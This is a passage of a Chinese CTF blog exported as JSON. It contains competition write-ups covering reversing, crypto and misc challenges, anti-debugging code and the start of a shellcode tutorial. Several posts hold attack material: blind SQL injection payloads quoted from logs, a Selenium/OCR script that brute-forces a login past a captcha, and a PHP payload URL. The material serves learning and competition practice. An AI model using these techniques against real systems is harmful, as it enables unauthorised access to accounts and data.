2015\\Projects\\ConsoleApplication2\\Debug&gt; .\\ConsoleApplication2.exe 51966 42 h4cky0u第二个if判断是否为51966atoi (表示 ascii to integer)是把字符串转换成整型数的一个函数第三个if判断可以用很多，自己挑一个数满足余5不等于3，余17等于8。第四个if判断比较最后一个参数和字符串h4cky0u比较。 ##吐槽一句，国庆加班太惨了。","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"ctfwp","slug":"ctfwp","permalink":"http://ki9mu.github.io/tags/ctfwp/"}]},{"title":"反调试技术","slug":"反调试技术","date":"2019-08-27T12:07:12.000Z","updated":"2020-07-28T15:49:57.688Z","comments":true,"path":"2019/08/27/反调试技术/","link":"","permalink":"http://ki9mu.github.io/2019/08/27/反调试技术/","excerpt":"","text":"反调试技术主要目的是为了防止调试。以下为基本的反调试技术： 函数检测 数据检测 符号检测 窗口检测 特征码检测 断点检测 行为检测 功能破坏 行为占用后面的博客基本会围绕这些方面来进行。","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"反调试","slug":"反调试","permalink":"http://ki9mu.github.io/tags/反调试/"}]},{"title":"函数检测","slug":"函数检测","date":"2019-08-27T12:05:08.000Z","updated":"2020-07-28T15:49:23.605Z","comments":true,"path":"2019/08/27/函数检测/","link":"","permalink":"http://ki9mu.github.io/2019/08/27/函数检测/","excerpt":"windows API方法来反调试在windows中主要有2个api来检测程序是否处于调试中： IsDebuggerPresent() CheckRemoteDebuggerPresent（）","text":"windows API方法来反调试在windows中主要有2个api来检测程序是否处于调试中： IsDebuggerPresent() CheckRemoteDebuggerPresent（） 以下为IsDebuggerPresent()的检测代码 12345678910111213141516171819202122232425262728// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。// Author: ki9mu// Time: 2019/08/27 20:25#include &quot;stdafx.h&quot;#include&lt;windows.h&gt;#include&lt;iostream&gt;#include&quot;string.h&quot;bool function_check()&#123; if (IsDebuggerPresent()) &#123; //MessageBox(NULL, L&quot;调试ing&quot;, L&quot;by @ki9mu&quot;, 0); return true; &#125; else &#123; //MessageBox(NULL, L&quot;雨女无瓜&quot;, L&quot;by @ki9mu&quot;, 0); return false; &#125;&#125;int main()&#123; bool a； a=function_check(); cout&lt;&lt;a; return 0;&#125; 运行结果如下： 而调试结果如下： 更改结果此处使用的是x64dbg 在符号表中找到IsDebuggerPresent位置，并下断点。 开始调试，断点处停下。 更改eax的值(此处eax的值反应的是否为调试,0为未调试，1为调试) 直接运行到返回位置，即更改后。","categories":[],"tags":[{"name":"反调试","slug":"反调试","permalink":"http://ki9mu.github.io/tags/反调试/"}]},{"title":"2019年安恒6月月赛","slug":"2019年安恒6月月赛","date":"2019-06-29T13:04:00.000Z","updated":"2020-07-28T15:50:02.149Z","comments":true,"path":"2019/06/29/2019年安恒6月月赛/","link":"","permalink":"http://ki9mu.github.io/2019/06/29/2019年安恒6月月赛/","excerpt":"","text":"misc简单的日志分析通过分析很明显看出来是盲注，原谅还是太菜，正则写得不熟练，特别其中某个坑。偷个懒，反正就少了括号。 1234567891011121314151617181920212223242526272829303132333435import re#&quot;C:\\\\Users\\\\ki9mu\\\\Desktop\\\\file&quot;#pwd = input(&quot;请输入路径:\\n&quot;)i = 0pwd = &quot;C:\\\\Users\\\\ki9mu\\\\Desktop\\\\file&quot;list1 = []ssr = &quot;&quot;with open(pwd) as f: string1 = f.readline() string2 = f.readline() while i &lt; 2000: i = i + 1 #格式如下 #192.168.80.1 - - [01/Mar/2019:10:15:00 -0500] &quot;GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),16,1)=binary(&apos;3&apos;),1,sleep(3)) HTTP/1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests/2.21.0&quot; #正则匹配 cmp1 = re.compile(&apos;\\\\d+:\\\\d+:\\\\d+:\\\\d+&apos;).findall(string1,re.DOTALL) cmp2 = re.compile(&apos;\\\\d+:\\\\d+:\\\\d+:\\\\d+&apos;).findall(string2,re.DOTALL) if cmp1 == cmp2: #print(string1) #ki9mu提取字符 temp = &quot;&quot;.join(re.compile(&quot;&quot;&quot;binary\\\\(\\\\&apos;(.)\\\\&apos;&quot;&quot;&quot;).findall(string1,re.DOTALL)) if temp == &quot;&quot;: pass else: print(re.compile(&quot;&quot;&quot;\\\\)\\\\,(\\\\d+)\\\\,&quot;&quot;&quot;).findall(string1,re.DOTALL)) print(re.compile(&quot;&quot;&quot;binary\\\\(\\\\&apos;(.)\\\\&apos;&quot;&quot;&quot;).findall(string1,re.DOTALL)) ssr = ssr + temp string1 = string2 string2 = f.readline()print(ssr)print(len(ssr)) 代码运行结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687C:\\Users\\newen\\AppData\\Local\\Programs\\Python\\Python36-32\\python.exe E:/program/pycharm/py/ctf正则/main.py[&apos;1&apos;, &apos;1&apos;][&apos;0&apos;][&apos;1&apos;, &apos;1&apos;][&apos;f&apos;][&apos;1&apos;, &apos;1&apos;][&apos;f&apos;][&apos;2&apos;, &apos;1&apos;][&apos;l&apos;][&apos;3&apos;, &apos;1&apos;][&apos;a&apos;][&apos;4&apos;, &apos;1&apos;][&apos;g&apos;][&apos;1&apos;, &apos;1&apos;][&apos;f&apos;][&apos;2&apos;, &apos;1&apos;][&apos;l&apos;][&apos;3&apos;, &apos;1&apos;][&apos;a&apos;][&apos;4&apos;, &apos;1&apos;][&apos;g&apos;][&apos;6&apos;, &apos;1&apos;][&apos;5&apos;][&apos;7&apos;, &apos;1&apos;][&apos;0&apos;][&apos;8&apos;, &apos;1&apos;][&apos;f&apos;][&apos;9&apos;, &apos;1&apos;][&apos;1&apos;][&apos;10&apos;, &apos;1&apos;][&apos;e&apos;][&apos;11&apos;, &apos;1&apos;][&apos;a&apos;][&apos;12&apos;, &apos;1&apos;][&apos;7&apos;][&apos;13&apos;, &apos;1&apos;][&apos;c&apos;][&apos;14&apos;, &apos;1&apos;][&apos;f&apos;][&apos;15&apos;, &apos;1&apos;][&apos;1&apos;][&apos;16&apos;, &apos;1&apos;][&apos;5&apos;][&apos;17&apos;, &apos;1&apos;][&apos;4&apos;][&apos;18&apos;, &apos;1&apos;][&apos;4&apos;][&apos;19&apos;, &apos;1&apos;][&apos;1&apos;][&apos;20&apos;, &apos;1&apos;][&apos;0&apos;][&apos;21&apos;, &apos;1&apos;][&apos;6&apos;][&apos;22&apos;, &apos;1&apos;][&apos;e&apos;][&apos;23&apos;, &apos;1&apos;][&apos;3&apos;][&apos;24&apos;, &apos;1&apos;][&apos;5&apos;][&apos;25&apos;, &apos;1&apos;][&apos;5&apos;][&apos;26&apos;, &apos;1&apos;][&apos;5&apos;][&apos;27&apos;, &apos;1&apos;][&apos;c&apos;][&apos;29&apos;, &apos;1&apos;][&apos;c&apos;][&apos;30&apos;, &apos;1&apos;][&apos;c&apos;][&apos;31&apos;, &apos;1&apos;][&apos;2&apos;][&apos;32&apos;, &apos;1&apos;][&apos;c&apos;][&apos;33&apos;, &apos;1&apos;][&apos;f&apos;][&apos;34&apos;, &apos;1&apos;][&apos;4&apos;][&apos;35&apos;, &apos;1&apos;][&apos;0&apos;][&apos;36&apos;, &apos;1&apos;][&apos;8&apos;][&apos;37&apos;, &apos;1&apos;][&apos;7&apos;]0fflagflag50f1ea7cf1544106e3555ccc2cf408741Process finished with exit code 0 原本是很简单的一行0fflagflag50f1ea7cf1544106e3555ccc2cf4087但是怎么提交怎么不对，对数据整理后，发现居然没有28？？？wtf？？仔细看那一段日志 1234192.168.80.1 - - [01/Mar/2019:10:37:25 -0500] &quot;GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),28,1)=binary(&apos;3&apos;),1,sleep(3)) HTTP/1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests/2.21.0&quot;192.168.80.1 - - [01/Mar/2019:10:37:28 -0500] &quot;GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),28,1)=binary(&apos;4&apos;),1,sleep(3)) HTTP/1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests/2.21.0&quot;192.168.80.1 - - [01/Mar/2019:10:37:29 -0500] &quot;GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),28,1)=binary(&apos;5&apos;),1,sleep(3)) HTTP/1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests/2.21.0&quot;192.168.80.1 - - [01/Mar/2019:10:37:32 -0500] &quot;GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),28,1)=binary(&apos;6&apos;),1,sleep(3)) HTTP/1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests/2.21.0&quot; 中间延迟了1秒。。。，手动补上。 第二种办法，直接将50f1ea7cf1544106e3555ccc2cf4087百度，你会发现有人已经问过这个md5了。直接将c4cc2直接出来。 re又是crackmeida分析main函数 1234567891011121314151617181920212223242526.text:00401540 jb short loc_401538.text:00401542 add edx, eax.text:00401544 mov byte ptr [esp+3Eh], 62h.text:00401549 mov byte ptr [esp+41h], 70h.text:0040154E mov byte ptr [esp+42h], 7Bh.text:00401553 mov byte ptr [esp+43h], 63h.text:00401558 mov byte ptr [esp+44h], 72h.text:0040155D mov byte ptr [esp+45h], 61h.text:00401562 mov byte ptr [esp+46h], 63h.text:00401567 mov byte ptr [esp+47h], 6Bh.text:0040156C mov byte ptr [esp+48h], 20h.text:00401571 mov byte ptr [esp+49h], 65h.text:00401576 mov byte ptr [esp+4Ah], 31h.text:0040157B mov byte ptr [esp+4Bh], 30h.text:00401580 mov byte ptr [esp+4Ch], 30h.text:00401585 mov byte ptr [esp+4Dh], 7Dh.text:0040158A mov dword ptr [esp], offset aPleaseInputFla ; &quot;please input flag:\\n&gt;&quot;.text:00401591 call _printf.text:00401596 mov byte ptr [esp+3Dh], 44h.text:0040159B mov byte ptr [esp+48h], 6Dh.text:004015A0 mov byte ptr [esp+40h], 70h.text:004015A5 mov byte ptr [esp+3Fh], 61h.text:004015AA lea eax, [esp+1Dh].text:004015AE mov ecx, 20h.text:004015B3 mov ebx, 0.text:004015B8 mov [eax], ebx 结果就出来了，早知道先做这个了 crypto你认识我吗12345678910111213plainText length is 77key length is 11y o s t f Y z i d i h i a A s h l c g _ g n k s i o g m k n i f n &#123; a t u t n p f e h l h s t l _ I o t m y s r h a u r i A &#125; o w c e l o i u t o n a u n 这个直接看出来是列位移密码，还给了脚本。flag提交部分密文比较短，手一写就出来了。最后一列是re_Amazing} 脚本整理看看最终结果。（原谅我丑陋至极的脚本） 123456789101112131415161718string=&quot;&quot;&quot;yisnkthlhou odhknuloawtsilsithtucothcifnsmren figonptyila Ya_g&#123;flsAou zAgmae_r&#125;in&quot;&quot;&quot;l = [i for i in string.split(&apos;\\n&apos;)]ind = &apos;re_Amazing&#125;&apos;temp = []sss = [1]*77for i in l[6]: temp.append(ind.find(i))for i in range(0,7): for x in range(0,11): sss[i*11 + temp[x]] = l[i][x]s = &quot;&quot;.join(i for i in sss)print(s) 运行结果lthinkyoushouldknowthatthisiscolumnshiftencryptionflagisflag{You_Are_Amazing} web题居然1个也没做出来，迷茫，后头等wp康康","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"ctfwp","slug":"ctfwp","permalink":"http://ki9mu.github.io/tags/ctfwp/"}]},{"title":"ISCC部分wp","slug":"ISCC部分wp","date":"2019-05-09T06:06:21.000Z","updated":"2020-07-28T15:49:50.620Z","comments":true,"path":"2019/05/09/ISCC部分wp/","link":"","permalink":"http://ki9mu.github.io/2019/05/09/ISCC部分wp/","excerpt":"","text":"MISC隐藏的信息下载后打开压缩包，里面有一个message.txt，内容如下 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 根据内容中每个数据是0开头，以及没有大于7的数据可以很明显地看到这是8进制数据。转化为ascii尝试一下。 1V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K 这里可以看出来是base64编码。 12Well done!Flag: ISCC&#123;****************&#125; 倒立屋下载后发现是一张图片图片隐写一般就那一套，先挨个试试(这道题是个巨无霸坑)。IDAT隐写尝试：发现没藏什么特殊的东西。LSB隐写尝试：这里能看到ISCC2019，心想主办方还有个彩蛋，但其实这里是个大坑。正常ctf的格式一般是有花括号{}的。这道题的答案其实是9102_cCsI。 Aesop’s secret打开发现是个闪烁的gif图，将它合成一张具体的图。发现看不出来什么，继续祭出神器分析。 1U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw== 这里能够看到一串base64，直接解发现是乱码。合成的图肯定是有用的，尝试一波aes，密码为合成后图片中的ISCCbase64解码发现还是乱码，再次aes一波，得到flag。 REanswer to everything这个文件名有问题，本以为是pe，没想到还是elf文件。ue打开文件头可以看出。把文件后缀exe去了，拖入ida，f5进入main函数。 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v4; // [sp+Ch] [bp-4h]@1 printf(&quot;Gimme: &quot;, argv, envp); __isoc99_scanf(&quot;%d&quot;, &amp;v4); not_the_flag(v4); return 0;&#125; 第5行就是一个打印函数，第6行是输入。重点还是第7行的函数。 12345678__int64 __fastcall not_the_flag(int a1)&#123; if ( a1 == 42 ) puts(&quot;Cipher from Bill \\nSubmit without any tags\\n#kdudpeh&quot;); else puts(&quot;YOUSUCK&quot;); return 0LL;&#125; 这里能看到，答案就是42，看到题目 12sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。注意：将得到的flag变为ISCC&#123;flag&#125;形式提交。 然后将kdudpeh进行sha1一下，提交就是flag。PS：我觉得这种题应该放在misc里。 Rev01这里是个原题。参考文章：https://www.anquanke.com/post/id/169970PS：第一题和第二题难度差太大了，幸好是原题。但也有一部分的坑。本题是rust语言编写的，对我等菜鸡来说逆向难度相当大，一堆函数足以劝退逆向萌新了。ida载入文件 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax@1 __int64 (__fastcall *v4)(); // [sp+0h] [bp-8h]@1 v4 = beginer_reverse::main::h80fa15281f646bc1; //这里才是主函数，beginer_reverse也能看出来。 std::rt::lang_start_internal::had9505969b8e20a2( (__int64)&amp;v4, (__int64)&amp;anon_0e239fffff9ba82fdffb4d9fcd948ac0_0_llvm_15443791065720472637, argc, (__int64)argv); return result;&#125; 跟进之后的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245void beginer_reverse::main::h80fa15281f646bc1()&#123; __int64 v0; // rax@1 volatile signed __int64 *v1; // rax@2 bool v2; // zf@2 __int64 v3; // r13@5 signed __int64 v4; // rax@5 __int64 v5; // rcx@6 char v6; // dl@6 signed __int64 v7; // r8@6 char v8; // si@10 char v9; // di@12 int v10; // ebp@14 int v11; // esi@15 int v12; // edi@17 int v13; // edx@22 __int64 v14; // rcx@24 unsigned __int64 v15; // rsi@24 signed __int64 v16; // r14@24 unsigned __int64 v17; // rbp@24 int v18; // er12@25 unsigned __int64 v19; // rbx@25 signed __int64 v20; // rax@31 signed __int64 v21; // rax@33 __int64 v22; // rcx@38 int v23; // edx@40 __int64 v24; // rdx@45 unsigned __int64 v25; // rsi@45 __int64 v26; // rcx@45 volatile signed __int64 *v27; // [sp+0h] [bp-B8h]@2 __int64 v28; // [sp+8h] [bp-B0h]@2 __int128 v29; // [sp+10h] [bp-A8h]@2 __int128 v30; // [sp+20h] [bp-98h]@23 unsigned __int64 v31; // [sp+30h] [bp-88h]@35 __int64 v32; // [sp+38h] [bp-80h]@24 __int64 v33; // [sp+40h] [bp-78h]@2 __int128 v34; // [sp+48h] [bp-70h]@2 void **v35; // [sp+58h] [bp-60h]@2 __int128 v36; // [sp+60h] [bp-58h]@51 const char *v37; // [sp+78h] [bp-40h]@51 __int64 v38; // [sp+80h] [bp-38h]@51 _rust_alloc(); if ( !v0 ) alloc::alloc::handle_alloc_error::h9e3787e5722c870d(); *(_OWORD *)v0 = xmmword_51000; *(_OWORD *)(v0 + 16) = xmmword_51010; *(_OWORD *)(v0 + 32) = xmmword_51020; *(_OWORD *)(v0 + 48) = xmmword_51030; *(_OWORD *)(v0 + 64) = xmmword_51040; *(_OWORD *)(v0 + 80) = xmmword_51050; *(_OWORD *)(v0 + 96) = xmmword_51060; *(_OWORD *)(v0 + 112) = xmmword_51070; *(_QWORD *)(v0 + 128) = 618475290964LL; v33 = v0; v34 = xmmword_51080; v28 = 1LL; v29 = 0LL; std::io::stdio::stdin::hcd3fd1740d5196a7(); v27 = v1; std::io::stdio::Stdin::read_line::h85c3421ca914511e(); v2 = v35 == (void **)1; if ( v35 == (void **)1 ) &#123; v30 = v36; core::result::unwrap_failed::h2bf42cb74d1e7d4b(&quot;Error reading input: \\x01&quot;, 19LL, &amp;v30); &#125; _InterlockedSub8(v27, 1uLL); if ( v2 ) _$LT$alloc..sync..Arc$LT$T$GT$$GT$::drop_slow::h82dbb96617da66a0(&amp;v27, &amp;v27); v3 = v28; v4 = *((_QWORD *)&amp;v29 + 1); if ( *((_QWORD *)&amp;v29 + 1) ) &#123; v5 = *((_QWORD *)&amp;v29 + 1) + v28; v6 = *(_BYTE *)(*((_QWORD *)&amp;v29 + 1) + v28 - 1); v7 = 1LL; if ( v6 &gt;= 0 ) &#123;LABEL_7: v4 = *((_QWORD *)&amp;v29 + 1) - v7; *((_QWORD *)&amp;v29 + 1) = v4; v5 = v4 + v28; goto LABEL_23; &#125; if ( v28 == v5 - 1 ) &#123; v11 = 0; &#125; else &#123; v8 = *(_BYTE *)(v5 - 2); if ( (*(_BYTE *)(v5 - 2) &amp; 0xC0) == -128 ) &#123; if ( v28 == v5 - 2 ) &#123; v12 = 0; &#125; else &#123; v9 = *(_BYTE *)(v5 - 3); if ( (*(_BYTE *)(v5 - 3) &amp; 0xC0) == -128 ) &#123; if ( v28 == v5 - 3 ) v10 = 0; else v10 = (*(_BYTE *)(*((_QWORD *)&amp;v29 + 1) + v28 - 4) &amp; 7) &lt;&lt; 6; v12 = v10 | v9 &amp; 0x3F; &#125; else &#123; v12 = v9 &amp; 0xF; &#125; &#125; v11 = (v12 &lt;&lt; 6) | v8 &amp; 0x3F; &#125; else &#123; v11 = v8 &amp; 0x1F; &#125; &#125; v13 = (v11 &lt;&lt; 6) | v6 &amp; 0x3F; if ( v13 != 1114112 ) &#123; if ( (unsigned int)v13 &gt;= 0x80 ) &#123; v7 = 2LL; if ( (unsigned int)v13 &gt;= 0x800 ) v7 = 4LL - ((unsigned int)v13 &lt; 0x10000); &#125; goto LABEL_7; &#125; &#125; else &#123; v4 = 0LL; v5 = v28; &#125;LABEL_23: *(_QWORD *)&amp;v30 = 4LL; *(__int128 *)((char *)&amp;v30 + 8) = 0LL; if ( v4 ) &#123; v14 = v5 - v28; v15 = 0LL; v16 = 4LL; v17 = 0LL; v32 = v14; do &#123; v18 = *(_BYTE *)(v3 + v17); v19 = v15; if ( v17 == v15 ) &#123; v19 = v15 + 1; if ( v15 &gt;= 0xFFFFFFFFFFFFFFFFLL ) goto LABEL_68; if ( v19 &lt; 2 * v15 ) v19 = 2 * v15; if ( !is_mul_ok(4uLL, v19) )LABEL_68: alloc::raw_vec::capacity_overflow::hbc659f170a622eae(); if ( v15 ) &#123; _rust_realloc(); v16 = v20; v14 = v32; if ( !v20 ) goto LABEL_63; &#125; else &#123; _rust_alloc(); v16 = v21; v14 = v32; if ( !v21 )LABEL_63: alloc::alloc::handle_alloc_error::h9e3787e5722c870d(); &#125; *(_QWORD *)&amp;v30 = v16; *((_QWORD *)&amp;v30 + 1) = v19; v15 = v19; &#125; *(_DWORD *)(v16 + 4 * v17++) = v18; v31 = v17; &#125; while ( v14 != v17 ); &#125; else &#123; v16 = 4LL; v19 = 0LL; v17 = 0LL; &#125; v22 = 0LL; while ( 4 * v17 != v22 ) &#123; v23 = *(_DWORD *)(v16 + v22) - 32; v22 += 4LL; if ( (unsigned int)v23 &gt;= 0x5F ) std::panicking::begin_panic::h770c088eb8f42530( &quot;an error occuredSubmit this and get you&apos;r points!\\n&quot;, 16LL, &amp;off_64F10, v22); &#125; if ( v17 &gt; *((_QWORD *)&amp;v34 + 1) ) v17 = *((_QWORD *)&amp;v34 + 1); if ( !v17 ) &#123; if ( *((_QWORD *)&amp;v34 + 1) ) goto LABEL_52; goto LABEL_51; &#125; v24 = 0LL; v25 = 0LL; v26 = 0LL; do &#123; if ( v16 == v24 ) break; v2 = ((*(_DWORD *)(v33 + 4 * v25) &gt;&gt; 2) ^ 0xA) == *(_DWORD *)(v16 + 4 * v25); ++v25; v26 += v2; v24 -= 4LL; &#125; while ( v25 &lt; v17 ); if ( v26 == *((_QWORD *)&amp;v34 + 1) ) &#123;LABEL_51: v35 = &amp;off_64F00; *(_QWORD *)&amp;v36 = 1LL; *((_QWORD *)&amp;v36 + 1) = 0LL; v37 = &quot;src/main.rsError reading input: \\x01&quot;; v38 = 0LL; std::io::stdio::_print::h77f73d11755d3bb8(); &#125;LABEL_52: if ( v19 ) _rust_dealloc(); if ( (_QWORD)v29 ) _rust_dealloc(); if ( (_QWORD)v34 ) _rust_dealloc();&#125; 这里的这部分很明显是密文。 1234567891011if ( !v0 ) alloc::alloc::handle_alloc_error::h9e3787e5722c870d();*(_OWORD *)v0 = xmmword_51000;*(_OWORD *)(v0 + 16) = xmmword_51010;*(_OWORD *)(v0 + 32) = xmmword_51020;*(_OWORD *)(v0 + 48) = xmmword_51030;*(_OWORD *)(v0 + 64) = xmmword_51040;*(_OWORD *)(v0 + 80) = xmmword_51050;*(_OWORD *)(v0 + 96) = xmmword_51060;*(_OWORD *)(v0 + 112) = xmmword_51070;*(_QWORD *)(v0 + 128) = 618475290964LL; 查看到地址的内容 123456789101112131415.rodata:0000000000051000 xmmword_51000 xmmword 1E4000001FC0000018000000154h.rodata:0000000000051000 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+29\u0018r.rodata:0000000000051010 xmmword_51010 xmmword 1BC0000019000000154000001F8h.rodata:0000000000051010 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+33\u0018r.rodata:0000000000051020 xmmword_51020 xmmword 1F800000154000001B8000001BCh.rodata:0000000000051020 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+3E\u0018r.rodata:0000000000051030 xmmword_51030 xmmword 1BC000001B40000015400000194h.rodata:0000000000051030 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+49\u0018r.rodata:0000000000051040 xmmword_51040 xmmword 188000001F400000154000001F8h.rodata:0000000000051040 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+54\u0018r.rodata:0000000000051050 xmmword_51050 xmmword 18C00000154000001F8000001ACh.rodata:0000000000051050 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+5F\u0018r.rodata:0000000000051060 xmmword_51060 xmmword 1BC0000019000000154000001E4h.rodata:0000000000051060 ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+6A\u0018r.rodata:0000000000051070 xmmword_51070 xmmword 1B8000001BC000001B8000001BCh 写出python脚本 12345# -*- coding: UTF-8 -*-cipher=[0x154, 0x180, 0x1FC, 0x1E4, 0x1F8, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x154, 0x1F8, 0x194, 0x154, 0x1B4, 0x1BC, 0x1F8, 0x154, 0x1F4, 0x188, 0x1AC, 0x1F8, 0x154, 0x18C, 0x1E4, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x1BC, 0x1B8,0x00000154, 0x0000090, 0x00000000, 0x00000000]print len(cipher)cipher = &apos;&apos;.join(map(lambda x: chr((x&gt;&gt;2) ^ 0xa), cipher))print cipher 最后面的0x154和0x90来自这一行，不要漏了。 1*(_QWORD *)(v0 + 128) = 618475290964LL; ida中鼠标右键转为hex得到内容 1*(_QWORD *)(v0 + 128) = 0x9000000154LL; webweb2ps:我是真不明白为什么web放在前面，web1放在后面。看了下题目，明显得爆破，本以为验证码是固定不变得，burp直接爆破就行了，然而我还是太天真，还是得ocr写脚本跑。 123456789101112131415161718192021222324252627282930313233343536373839404142import pyocrimport osimport cv2 as cvimport timeimport PILfrom pyocr import pyocrfrom selenium import webdriverimport pytesseractimport redef cz(num): return &apos;0&apos; * (3 - len(str(num))) + str(num)if __name__ == &apos;__main__&apos;: browser = webdriver.Chrome() tools = pyocr.get_available_tools() browser.get(&apos;http://39.100.83.188:8002&apos;) not_p = [cz(i) for i in range(1000)] # browser.add_cookie(&#123;&apos;name&apos;: &apos;asdf&apos;, &apos;value&apos;: &apos;asdfsadfd&apos;&#125;) while len(not_p): i = not_p.pop() browser.get_screenshot_as_file(&apos;D:\\\\project\\\\OCR_CTF\\\\res.png&apos;) yzm = cv.imread(&apos;D:\\\\project\\\\OCR_CTF\\\\res.png&apos;)[100: 126, 16: 60] ocrres = pytesseract.image_to_string(yzm) browser.find_element_by_xpath(&apos;/html/body/form/input[2]&apos;).clear() browser.find_element_by_xpath(&apos;/html/body/form/input[3]&apos;).clear() browser.find_element_by_xpath(&apos;/html/body/form/input[2]&apos;).send_keys(i) browser.find_element_by_xpath(&apos;/html/body/form/input[3]&apos;).send_keys(ocrres) browser.find_element_by_xpath(&apos;/html/body/form/input[4]&apos;).click() print(re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0] + &apos; 密码:&apos; + i) if &apos;楠岃&apos; in re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0]: not_p.append(i) print(&apos;验证码错误&apos;) else: if &apos;瀵嗙&apos; not in re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0]: print(&apos;密码是: &apos; + i) exit() browser.back() browser.refresh() time.sleep(0.5) 运行得到结果，密码是996，真是与当今时事热点相连。 web11234567891011121314151617&lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value = $_GET[&apos;value&apos;];$password = $_GET[&apos;password&apos;];$username = &apos;&apos;;for ($i = 0; $i &lt; count($value); ++$i) &#123; if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &apos;w3lc0me_To_ISCC2019&apos; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL; echo $flag, &apos;&lt;hr&gt;&apos;; &#125;&#125;highlight_file(__FILE__); chr函数在转换时会自动取模256,所以我们只需要在原本ascii码基础上加上256。 intval()处理16进制时有些问题,但强制转换时时正常的。 所以将w3lc0me_To_ISCC2019转换并加上256。 1234567891011a=&quot;77336c63306d655f546f5f4953434332303139&quot;temp = &quot;&quot;temp1=0for x in a: if temp1==0: temp=&quot;&quot; temp=temp+x temp1=temp1+1 if temp1==2: print eval(&apos;0x&apos;+temp)+256 temp1=0 payload为： 1http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d PS：比赛打得心累，弃赛了。PS2:本来是给安全客投稿的被拒了，干脆就发出来了。PSSS：千万别像我一样想着二进制和web双修，然后两个都打的菜得一批。","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"ctfwp","slug":"ctfwp","permalink":"http://ki9mu.github.io/tags/ctfwp/"}],"author":"ki9mu"},{"title":"shellcode编写","slug":"shellcode编写","date":"2019-04-19T12:22:46.000Z","updated":"2020-07-28T15:49:55.908Z","comments":true,"path":"2019/04/19/shellcode编写/","link":"","permalink":"http://ki9mu.github.io/2019/04/19/shellcode编写/","excerpt":"","text":"shellcode的介绍 shellcode是指利用漏洞时执行的代码，目的多种多样，包括建立连接，本地提权等。 编写shellcode需要对目标系统的汇编语言有较深的了解。 写shellcode用到的常用工具有，NASM，GDB，ObjDump， Ktrace， Strace， Readelf等。 shellcode的编写的问题寻址问题如何确定传入参数的位置？ 通过call或者jmp来找到数据在堆栈中的位置 把参数压入堆栈，然后存储esp的值 例子1： 1234567jmp datacode:pop esiretdata:call codedb &apos;KIMU&apos; 这里首先跳转到data段中，然后调用call code（call是将自己下一行的地址压入堆栈，再jmp code），然后将堆栈地址放入esi中。此时esi中的内容就是字符串的地址。 例子2： 12push 